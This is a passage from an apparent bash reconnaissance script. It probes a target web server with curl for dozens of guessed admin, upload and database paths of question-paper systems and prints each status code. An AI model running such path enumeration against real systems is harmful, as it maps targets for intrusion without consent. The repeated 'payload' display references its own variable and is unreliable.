         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Manager/"]: "
